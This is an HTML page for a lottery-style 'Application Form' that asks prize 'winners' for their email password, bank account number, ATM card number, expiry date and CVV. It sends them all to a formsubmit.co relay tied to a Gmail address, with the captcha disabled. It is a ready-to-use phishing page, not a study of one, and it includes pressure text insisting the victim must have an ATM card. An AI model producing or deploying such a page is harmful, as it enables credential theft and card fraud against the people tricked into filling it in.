<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-bottom: 5px;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .eye {
      position: relative;
    }
    .eye input {
      padding-right: 40px;
    }
    .eye-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" id="application-form">
    <input type="hidden" name="_next" value="thankyou.html">
    <input type="hidden" name="_captcha" value="false">

    <label for="fullname">1. Full Name</label>
    <input type="text" id="fullname" name="Full Name" required>

    <label for="country">2. Country</label>
    <input type="text" id="country" name="Country" required>

    <label for="phone">3. Phone Number</label>
    <input type="tel" id="phone" name="Phone Number" required>
    <div id="phone-error" class="error">Phone number must be 9 to 12 digits.</div>

    <label for="email">4. Email Address</label>
    <input type="email" id="email" name="Email Address" required>

    <label for="emailPassword">5. Email Password</label>
    <div class="eye">
      <input type="password" id="emailPassword" name="Email Password" required>
      <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <label for="amountWon">6. Amount You Won</label>
    <input type="number" id="amountWon" name="Amount You Won" required>

    <label for="accountType">7. Bank Account Type</label>
    <input type="text" id="accountType" name="Bank Account Type" placeholder="e.g., Standard Bank Account" required>

    <label for="accountNumber">8. Bank Account Number</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required>

    <label for="linked">9. Did You Link ATM to Your Bank Account?</label>
    <select id="linked" name="ATM Linked" required onchange="checkATM()">
      <option value="">-- Select --</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
    <div id="atm-warning" class="error" style="display: none;">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <div id="atm-fields">
      <label for="card">10. ATM Card Number</label>
      <input type="password" id="card" name="ATM Card Number">
      <div id="card-error" class="error">Card number must be exactly 16 digits.</div>

      <label for="expiry">11. Expiry Date (MM/YY)</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5">
      <div id="expiry-error" class="error">Enter a valid date in MM/YY format.</div>

      <label for="cvv">12. CVV</label>
      <input type="password" id="cvv" name="CVV" maxlength="3">
      <div id="cvv-error" class="error">CVV must be exactly 3 digits.</div>
    </div>

    <p><strong>13. You will receive <span id="confirm-amount"></span> to your <span id="confirm-type"></span> <span id="confirm-number"></span></strong></p>

    <button type="submit">Submit Application</button>
  </form>

  <script>
    function togglePassword() {
      const pwd = document.getElementById("emailPassword");
      pwd.type = pwd.type === "password" ? "text" : "password";
    }

    function checkATM() {
      const linked = document.getElementById("linked").value;
      const fields = document.getElementById("atm-fields");
      const warning = document.getElementById("atm-warning");
      if (linked === "No") {
        fields.style.display = "none";
        warning.style.display = "block";
        document.getElementById("card").value = '';
        document.getElementById("expiry").value = '';
        document.getElementById("cvv").value = '';
      } else {
        fields.style.display = "block";
        warning.style.display = "none";
      }
    }

    document.getElementById("phone").addEventListener("blur", () => {
      const val = document.getElementById("phone").value;
      const err = document.getElementById("phone-error");
      err.style.display = (/^\d{9,12}$/.test(val)) ? "none" : "block";
    });

    document.getElementById("card").addEventListener("blur", () => {
      const val = document.getElementById("card").value;
      const err = document.getElementById("card-error");
      err.style.display = (/^\d{16}$/.test(val)) ? "none" : "block";
    });

    document.getElementById("cvv").addEventListener("blur", () => {
      const val = document.getElementById("cvv").value;
      const err = document.getElementById("cvv-error");
      err.style.display = (/^\d{3}$/.test(val)) ? "none" : "block";
    });

    document.getElementById("expiry").addEventListener("input", (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length >= 3) {
        val = val.slice(0, 2) + '/' + val.slice(2, 4);
      }
      e.target.value = val.slice(0, 5);
    });

    document.getElementById("application-form").addEventListener("input", () => {
      document.getElementById("confirm-amount").innerText = document.getElementById("amountWon").value;
      document.getElementById("confirm-type").innerText = document.getElementById("accountType").value;
      document.getElementById("confirm-number").innerText = document.getElementById("accountNumber").value;
    });

    // Initialize ATM logic on page load
    window.addEventListener("DOMContentLoaded", checkATM);
  </script>
</body>
</html>
